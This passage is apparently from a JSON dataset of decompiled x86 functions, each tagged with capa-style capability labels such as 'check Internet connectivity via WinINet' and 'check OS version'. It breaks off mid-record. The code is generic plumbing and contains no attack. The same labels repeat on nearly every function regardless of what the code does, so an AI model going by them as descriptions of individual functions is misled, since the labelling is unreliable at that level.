        "decompiled_code": "\nvoid __fastcall fcn.0046c7d8(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack552;\n    uint uStack548;\n    uchar *puStack544;\n    uint var_20ch;\n    uint var_208h;\n    uint var_108h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack544 = &stack0xfffffffc;\n    var_4h = 0;\n    var_8h = 0;\n    uStack548 = 0x46c8bf;\n    uStack552 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffdd8;\n    iVar1 = fcn.00403a28();\n    if (iVar1 == *(in_EAX + 0x1c)) {\n        fcn.0046bf4c();\n    }\n    else if (param_2[3] == 0) {\n        iVar1 = fcn.00403a28();\n        fcn.00403770(&fcn.0046c7d8::var_108h, *(iVar1 + 0xc));\n        fcn.00402cd0();\n        fcn.0040482c();\n        fcn.00408c28(var_8h);\n        fcn.00404948(0);\n        (**(*param_2 + 0x18))();\n    }\n    *in_FS_OFFSET = uStack552;\n    puStack544 = 0x46c8c6;\n    uStack548 = 0x46c8b1;\n    fcn.004045c8();\n    uStack548 = 0x46c8be;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 397
    },
    "0046cab4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0046cab4(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack36 = &fcn.0046cab4::var_1h + 1;\n    uStack40 = 0x46cb4c;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    cVar1 = (**(*in_EAX + 0x98))();\n    if (cVar1 == '\\0') {\n        fcn.0046cbdc();\n    }\n    iVar2 = (**(*in_EAX + 0x54))();\n    if (iVar2 < 0) {\n        if (var_1h != '\\0') {\n            iVar2 = in_EAX[0xc];\n            fcn.0040675c();\n            fcn.0046bc4c(iVar2);\n        }\n    }\n    else {\n        (**(*in_EAX + 0x18))();\n    }\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x46cb53;\n    uStack40 = 0x46cb4b;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 350
    },
    "0046cb84": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046cb84(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x46cbce;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    if (*(in_EAX + 0x34) != '\\0') {\n        fcn.0040675c();\n        fcn.0046bba0();\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x46cbd5;\n    uStack20 = 0x46cbcd;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 185
    },
    "0046cff4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046cff4(void)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    \n    piVar1 = *(in_EAX + 8);\n    if ((piVar1 != NULL) && ((*(piVar1 + 7) & 8) == 0)) {\n        (**(*piVar1 + 0xac))();\n    }\n    if (*(in_EAX + 0x12) != 0) {\n        (**(in_EAX + 0x10))();\n    }\n    return;\n}\n",
        "token_count": 121
    },
    "0046d0d4": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046d0d4(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    while (0 < *(*(in_EAX + 4) + 8)) {\n        iVar1 = fcn.0041c5b8();\n        *(iVar1 + 0x34) = 0;\n        fcn.00403820();\n        fcn.0041c3a4();\n    }\n    fcn.0046cff4();\n    return;\n}\n",
        "token_count": 111
    },
    "0046d1c8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0046d1c8(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((0 < *(in_EAX + 0xc)) && (0 < *(*(in_EAX + 4) + 8))) {\n        return *(in_EAX + 0xc);\n    }\n    return *(*(in_EAX + 4) + 8);\n}\n",
        "token_count": 86
    },
    "0046d620": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046d620(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x42) == '\\x02') && (param_2 != '\\0')) {\n        if (*(in_EAX + 0x74) == '\\0') {\n            fcn.0046eafc();\n        }\n        else {\n            fcn.0046e120();\n        }\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "0046d640": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.0046d640(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_40h;\n    uint var_30h;\n    uint uStack44;\n    uint *puStack40;\n    uint *var_20h;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_10h;\n    \n    puStack24 = &stack0xfffffffc;\n    iVar2 = 8;\n    do {\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    uStack28 = 0x46d6ff;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    if (*(in_EAX + 0x1d) == '\\0') {\n        if (in_EAX[0x19] != 0) {\n            var_20h = 0x46d6a6;\n            cVar1 = fcn.00474d20();\n            if (cVar1 != '\\0') {\n                var_20h = in_EAX[0x1c];\n                puStack40 = &fcn.0046d640::var_30h;\n                uStack44 = 0x46d6c0;\n                fcn.004757ec();\n                uStack44 = 0x46d6d1;\n                (**(*in_EAX[0x19] + 0x248))();\n                uStack44 = 0x46d6de;\n                (**(*in_EAX + 0xb4))();\n            }\n        }\n    }\n    else {\n        var_20h = 0x46d675;\n        puStack24 = &stack0xfffffffc;\n        fcn.004757ec();\n        var_20h = &fcn.0046d640::var_20h;\n        puStack40 = 0x46d680;\n        fcn.0046dee8();\n        var_20h = 0x46d689;\n        fcn.0046ca08();\n        var_20h = 0x46d696;\n        (**(*in_EAX + 0xb4))();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x46d706;\n    uStack28 = 0x46d6fe;\n    fcn.00405080();\n    return;\n}\n",
        "token_count": 560
    },
    "0046d778": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0046d778(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    if (*(*(arg_8h + -4) + 0x20) != 0) {\n        uVar1 = fcn.004089a0();\n        return uVar1 & 0xffffff00 | uVar1 != 0;\n    }\n    return *(arg_8h + -8) & 0xffffff00 | *(*(arg_8h + -8) + 0x7c) != 0;\n}\n",
        "token_count": 126
    },
    "0046d7b8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0046d7b8(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) != 0) {\n        cVar1 = fcn.0046dae8();\n        uVar2 = fcn.0046dae8();\n        return uVar2 & 0xffffff00 | cVar1 != uVar2;\n    }\n    uVar2 = fcn.0046dae8();\n    return uVar2;\n}\n",
        "token_count": 129
    },
    "0046d7fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0046d7fc(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    \n    if (*(*(arg_8h + -4) + 0x20) != 0) {\n        cVar1 = fcn.0046dee0();\n        uVar2 = fcn.0046dee0();\n        return uVar2 & 0xffffff00 | cVar1 != uVar2;\n    }\n    uVar2 = fcn.0046dee0();\n    return uVar2;\n}\n",
        "token_count": 128
    },
    "0046dae8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.0046dae8(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x42) == '\\x01';\n}\n",
        "token_count": 50
    },
    "0046daf0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046daf0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = (**(*in_EAX + 0x7c))();\n    if (0 < iVar2) {\n        if (*(in_EAX[0xd] + 0x9d) == '\\x04') {\n            uVar3 = fcn.0046dea8();\n            return uVar3;\n        }\n        if ((*(in_EAX + 0x41) == '\\0') && (cVar1 = (**(*in_EAX[0xd] + 0x124))(),  cVar1 != '\\0')) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 174
    },
    "0046dc98": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0046dc98(uint param_1, int32_t param_2)\n\n{\n    uchar *puVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd0;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x46dd45;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    if (in_EAX[0xd] == 0) {\n        in_stack_ffffffd0 = 0;\n        fcn.0046dd78();\n        var_8h = 0;\n        var_4h._0_1_ = 0xb;\n        fcn.0040675c(&fcn.0046dc98::var_8h);\n        fcn.0046bc4c(in_stack_ffffffd0);\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    if (*(in_EAX + 0x46) == '\\0') {\n        (**(*in_EAX[0xd] + 0x238))(param_1);\n    }\n    else if ((in_EAX[0x18] != 0) && (param_2 != 0)) {\n        (**(*in_EAX + 0x74))();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd0;\n    uStack40 = 0x46dd4c;\n    uStack44 = 0x46dd44;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 415
    },
    "0046dd78": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046dd78(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x58) != 0) {\n        fcn.0040461c();\n        return;\n    }\n    fcn.0040461c();\n    return;\n}\n",
        "token_count": 65
    },
    "0046de10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046de10(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 0x98) != 0) && (*(in_EAX + 0x34) != 0)) {\n        (**(**(in_EAX + 0x34) + 0x130))();\n        return;\n    }\n    fcn.0040461c();\n    return;\n}\n",
        "token_count": 92
    },
    "0046de44": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046de44(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x80) == 0) && (*(in_EAX + 0x84) == 0)) && (*(in_EAX + 0x8c) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 83
    },
    "0046dea8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046dea8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if ((*(in_EAX + 0x34) != NULL) && (*(in_EAX + 0x98) == 0)) {\n        uVar1 = (**(**(in_EAX + 0x34) + 0x138))();\n        return uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 97
    },
    "0046dee8": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046dee8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x78) == 0) {\n        uVar1 = fcn.0046c924();\n        *(in_EAX + 0x78) = uVar1;\n    }\n    return *(in_EAX + 0x78);\n}\n",
        "token_count": 88
    },
    "0046e120": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.0046e120(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *var_28h;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_18h;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack20 = &fcn.0046e120::var_1h + 1;\n    iVar1 = 5;\n    do {\n        stack0xfffffffc = 0;\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    uStack24 = 0x46e246;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.0046e120::var_18h;\n    if (*(in_EAX + 100) != 0) {\n        puStack32 = 0x46e150;\n        puStack20 = &fcn.0046e120::var_1h + 1;\n        fcn.00474d20();\n        puStack32 = 0x46e15c;\n        fcn.0046eafc();\n        iVar1 = *(in_EAX + 100);\n        uStack36 = 0x46e215;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        var_28h = 0x46e177;\n        puStack32 = &fcn.0046e120::var_1h + 1;\n        fcn.0046dee8();\n        var_28h = 0x46e17c;\n        fcn.0046c9d0();\n        var_28h = 0x46e184;\n        fcn.0047625c();\n        uStack48 = 0x46e1f2;\n        uStack52 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffcc;\n        var_28h = &fcn.0046e120::var_1h + 1;\n        fcn.00476d24();\n        while (*(iVar1 + 0xa1) == '\\0') {\n            fcn.004757ec();\n            fcn.004757ec(&fcn.0046e120::var_18h);\n            fcn.0046c990();\n            fcn.00476fa4();\n        }\n        *in_FS_OFFSET = uStack52;\n        var_28h = 0x46e1f9;\n        uStack48 = 0x46e1f1;\n        fcn.0047627c();\n        return;\n    }\n    puStack32 = 0x46e225;\n    fcn.0046eafc();\n    *in_FS_OFFSET = var_18h;\n    puStack20 = 0x46e24d;\n    uStack24 = 0x46e245;\n    fcn.00405080();\n    return;\n}\n",
        "token_count": 695
    },
    "0046e578": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0046e578(uint param_1, uint param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStackY60;\n    uint uStackY56;\n    uint *puStackY52;\n    uint arg_8h;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x46e639;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puVar1 = &stack0xfffffffc;\n    var_4h = in_EAX;\n    if (*(in_EAX + 0x34) == 0) {\n        arg_8h = 0;\n        puStackY52 = 0x46e5b3;\n        fcn.0046dd78();\n        var_ch = 0;\n        var_8h._0_1_ = 0xb;\n        puStackY52 = &fcn.0046e578::var_ch;\n        uStackY56 = 0x46e5ce;\n        fcn.0040675c();\n        puStackY52 = 0x46e5d9;\n        fcn.0046bc4c(arg_8h);\n        puVar1 = puStack36;\n    }\n    puStack36 = puVar1;\n    *(var_4h + 0x60) = param_2;\n    uStackY56 = 0x46e617;\n    uStackY60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStackY52 = &stack0xfffffffc;\n    (**(**(var_4h + 0x34) + 0x1ec))();\n    *in_FS_OFFSET = param_1;\n    *(var_4h + 0x60) = 0;\n    return;\n}\n",
        "token_count": 484
    },
    "0046e648": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e648(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t in_EAX;\n    \n    piVar1 = *(in_EAX + 0x34);\n    if (param_2 != piVar1) {\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 0x8c))();\n        }\n        if (param_2 != NULL) {\n            (**(*param_2 + 0x8c))();\n            if (*(in_EAX + 0x42) == '\\x04') {\n                fcn.0046d1f0();\n            }\n            else {\n                fcn.0046d1f0();\n            }\n        }\n        if ((*(in_EAX + 0x98) == 0) || (param_2 == *(*(in_EAX + 0x98) + 0x34))) {\n            if (*(in_EAX + 0x34) != 0) {\n                if (*(in_EAX + 0x42) == '\\x04') {\n                    fcn.0046d0b4();\n                }\n                else {\n                    fcn.0046d0b4();\n                }\n            }\n        }\n        else {\n            fcn.0046d0b4();\n            *(in_EAX + 0x98) = 0;\n        }\n        if ((param_2 != NULL) && (*(in_EAX + 0x98) == 0)) {\n            if (*(in_EAX + 0x42) == '\\x04') {\n                fcn.0046d088();\n            }\n            else {\n                fcn.0046d088();\n            }\n        }\n        *(in_EAX + 0x34) = param_2;\n    }\n    return;\n}\n",
        "token_count": 401
    },
    "0046e864": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e864(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint var_4h;\n    \n    if (param_2 != *(in_EAX + 0x42)) {\n        if (*(in_EAX + 0x3c) != 0) {\n            uStack20 = 0x46e883;\n            fcn.0046d028();\n        }\n        if ((*(in_EAX + 0x34) != 0) && (*(*(in_EAX + 0x34) + 0x6c) != 0)) {\n            uStack20 = 0x46e89e;\n            fcn.0046bd38();\n            uStack28 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe4;\n            *(in_EAX + 0x42) = param_2;\n            *in_FS_OFFSET = uStack28;\n            uStack20 = 0x46e8d6;\n            uStack24 = 0x46e8c4;\n            fcn.0046bd70();\n            return;\n        }\n        uStack20 = 0x46e8d3;\n        fcn.0046d72c();\n        *(in_EAX + 0x42) = param_2;\n    }\n    return;\n}\n",
        "token_count": 322
    },
    "0046e8dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046e8dc(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uchar uVar2;\n    \n    fcn.0046d72c();\n    uVar2 = *(in_EAX + 0x34) == 0;\n    if (!uVar2) {\n        iVar1 = fcn.00408ab8();\n        uVar2 = iVar1 == 0;\n        if (!uVar2) {\n            fcn.0046d1f0();\n        }\n    }\n    fcn.0040461c();\n    fcn.004049d4();\n    if (uVar2) {\n        fcn.004045c8();\n    }\n    if (*(in_EAX + 0x34) != 0) {\n        fcn.0046cff4();\n    }\n    return;\n}\n",
        "token_count": 187
    },
    "0046eafc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0046eafc(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x46ebb7;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if (((param_2 != '\\0') && (((*(in_EAX + 100) == 0 || (*(in_EAX + 0x6c) == 0)) || (*(in_EAX + 0x70) == 0)))) ||\n       (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x68) == 0)) {\n        in_stack_ffffffd4 = 0;\n        fcn.0046dd78();\n        var_8h = 0;\n        var_4h._0_1_ = 0xb;\n        fcn.0040675c(&fcn.0046eafc::var_8h);\n        fcn.0046bc4c(in_stack_ffffffd4);\n        puVar1 = puStack32;\n    }\n    puStack32 = puVar1;\n    fcn.0046d28c();\n    if (param_2 != '\\0') {\n        fcn.00474bd4();\n        fcn.0046d28c();\n        fcn.00475904();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x46ebbe;\n    uStack40 = 0x46ebb6;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 438
    },
    "0046ef54": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ef54(char param_1)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x46efd1;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    if ((param_1 == '\\0') || (in_EAX[0x17] == 0)) {\n        (**(*in_EAX + 0x60))();\n        fcn.0040461c();\n    }\n    else {\n        puStack32 = &stack0xfffffffc;\n        (**(*in_EAX + 0x60))();\n        fcn.0045f1c4();\n        fcn.0040461c();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x46efd8;\n    uStack36 = 0x46efd0;\n    fcn.004045ec();\n    return;\n}\n",
        "token_count": 262
    },
    "0046efe0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046efe0(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack4136;\n    uint uStack4132;\n    uchar *puStack4128;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4128 = &stack0xfffffffc;\n    piVar1 = 0x2;\n    do {\n        piVar3 = piVar1;\n        piVar1 = piVar3 + -1;\n    } while (piVar3 + -1 != NULL);\n    uStack4132 = 0x46f0e7;\n    uStack4136 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffefd8;\n    iVar4 = (**(*piVar3 + 0x70))();\n    if (iVar4 < 0x2001) {\n        cVar2 = fcn.0046dc98();\n    }\n    else {\n        (**(*piVar3 + 0x70))();\n        fcn.00404c14();\n        fcn.00404a88();\n        cVar2 = fcn.0046dc98();\n        if (cVar2 != '\\0') {\n            fcn.0040928c();\n            fcn.00404c14();\n        }\n    }\n    if (cVar2 != '\\0') {\n        iVar4 = (**(*piVar3 + 0x70))();\n        if (iVar4 < 0x2001) {\n            fcn.00404838();\n        }\n        else {\n            fcn.0040461c();\n        }\n        if ((*(piVar3 + 0xe1) != '\\0') && (*param_2 != 0)) {\n            uVar5 = fcn.00404a88(0);\n            fcn.00404a88(uVar5);\n            (**(*piVar3[0xd] + 0x254))();\n        }\n    }\n    *in_FS_OFFSET = uStack4136;\n    puStack4128 = 0x46f0ee;\n    uStack4132 = 0x46f0e6;\n    fcn.004045c8();\n    return;\n}\n",
        "token_count": 520
    },
    "0046f2fc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
